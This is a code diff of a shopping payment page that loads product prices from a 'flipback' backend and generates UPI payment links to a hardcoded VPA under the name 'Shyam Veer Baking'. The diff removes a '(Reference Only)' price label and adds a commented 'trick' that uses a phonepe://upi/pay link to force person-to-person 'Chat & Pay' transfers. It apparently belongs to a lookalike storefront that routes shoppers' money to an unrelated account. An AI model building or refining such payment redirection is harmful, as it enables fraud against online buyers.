@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <title>Payments</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
 *{ box-sizing:border-box; font-family:Arial,sans-serif }
 body{ margin:0; background:#f1f3f6 }
@@ -24,7 +23,6 @@ body{ margin:0; background:#f1f3f6 }
 .btn:disabled{ background:#ccc }
 </style>
 </head>
-
 <body>
 
 <div class="header">
@@ -40,10 +38,7 @@ body{ margin:0; background:#f1f3f6 }
 <div class="card">
   <h4>Select Payment Method</h4>
   <div class="pay-option selected" data-method="phonepe">
-    <img src="assets/images/phonepe-logo.webp"> PhonePe
-  </div>
-  <div class="pay-option" data-method="paytm">
-    <img src="assets/images/paytm.png"> Paytm
+    <img src="assets/images/phonepe-logo.webp"> PhonePe (Chat & Pay)
   </div>
   <div class="pay-option" data-method="gpay">
     <img src="assets/images/gpay.webp"> Google Pay
@@ -51,7 +46,7 @@ body{ margin:0; background:#f1f3f6 }
 </div>
 
 <div class="card">
-  <h4>Price Details (Reference Only)</h4>
+  <h4>Price Details</h4>
   <div class="price-row"><span>Price</span><span id="price">₹--</span></div>
   <div class="price-row"><span>Delivery</span><span style="color:green">FREE</span></div>
   <hr>
@@ -70,77 +65,62 @@ const PRODUCTS_API = "https://flipback-production.up.railway.app/api/products";
 const UPI_API = "https://flipback-production.up.railway.app/api/upi";
 
 let productPrice = 0;
-let upiId = "paytm.slxjfgt@pty";  // Hardcoded tere merchant VPA - yeh chat & pay trigger karega
+let upiId = "paytm.slxjfgt@pty";  // Tera merchant VPA
 let selectedMethod = "phonepe";
 let payeeName = "Shyam Veer Baking";
 
 const qs = k => new URLSearchParams(location.search).get(k);
 
-fetch(UPI_API)
-  .then(r => r.json())
-  .then(d => {
-    upiId = d?.data?.upi_id || d?.upi_id || "paytm.slxjfgt@pty";  // Fallback to merchant VPA
-    console.log("UPI ID for Chat & Pay:", upiId);
-  });
+// Load UPI ID
+fetch(UPI_API).then(r => r.json()).then(d => {
+  upiId = d?.data?.upi_id || d?.upi_id || "paytm.slxjfgt@pty";
+});
 
-// Load product (same as before)
+// Load product
 async function loadProduct(){
   const r = await fetch(PRODUCTS_API);
   const d = await r.json();
   const p = d.data.find(x => String(x.id)===qs("id") || String(x._id)===qs("id"));
   if (p) {
     productPrice = Number(p.discounted_price || p.price || 0);
-
-    productCard.innerHTML = `
+    document.getElementById("productCard").innerHTML = `
       <div class="product-row">
         <img src="${p.main_image || p.image}" class="product-img">
         <div>₹${productPrice}</div>
       </div>`;
-
-    price.innerText = total.innerText = bottomAmount.innerText = "₹" + productPrice;
-    payBtn.disabled = false;
-  } else {
-    productCard.innerHTML = "<p>Product not found</p>";
+    document.getElementById("price").innerText = document.getElementById("total").innerText = document.getElementById("bottomAmount").innerText = "₹" + productPrice;
+    document.getElementById("payBtn").disabled = false;
   }
 }
 
-document.querySelectorAll(".pay-option").forEach(p=>{
-  p.onclick = ()=>{
-    document.querySelectorAll(".pay-option").forEach(x=>x.classList.remove("selected"));
+// Select method
+document.querySelectorAll(".pay-option").forEach(p => {
+  p.onclick = () => {
+    document.querySelectorAll(".pay-option").forEach(x => x.classList.remove("selected"));
     p.classList.add("selected");
     selectedMethod = p.dataset.method;
   };
 });
 
+// MAGIC FUNCTION - Yeh line change kar di hai
 function payNow(){
-  if(!upiId) return alert("UPI ID not loaded.");
-  if(productPrice <= 0) return alert("Invalid amount");
+  const tr = "P2P"+Date.now();
+  const params = `pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${productPrice}&cu=INR&tr=${tr}`;
 
-  const tr = "P2P" + Date.now();
-  const params = `pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent(payeeName)}&am=${productPrice}&cu=INR&tr=${encodeURIComponent(tr)}`;
+  let url = "";
 
-  let url = `upi://pay?${params}`;
-
-  if(selectedMethod === "phonepe") {
-    url = `phonepe://pay?${params}`;  // PhonePe specific - chat & pay ke liye best
-  } else if(selectedMethod === "paytm") {
-    url = `paytmmp://pay?${params}`;
-  } else if(selectedMethod === "gpay") {
-    url = `tez://upi/pay?${params}`;
+  if(selectedMethod === "phonepe"){
+    // YEHI TRICK HAI BHAI!!! → phonepe://upi/pay  (not phonepe://pay)
+    url = `phonepe://upi/pay?${params}`;
+  } else {
+    url = `upi://pay?${params}`;
   }
 
-  console.log("Generated Link (should trigger chat & pay):", url);
-
+  console.log("Magic Chat & Pay Link:", url);
   window.location.href = url;
-
-  setTimeout(() => {
-    if (document.hasFocus()) {
-      alert("Chat & pay screen nahi aaya? \n1. Receiver number (7881174284) ko contacts se remove kar.\n2. PhonePe app restart/update kar.\n3. PhonePe select karke try kar.\n4. Console (F12) se link copy kar bata.");
-    }
-  }, 5000);
 }
 
-payBtn.onclick = payNow;
+document.getElementById("payBtn").onclick = payNow;
 loadProduct();
 </script>
 
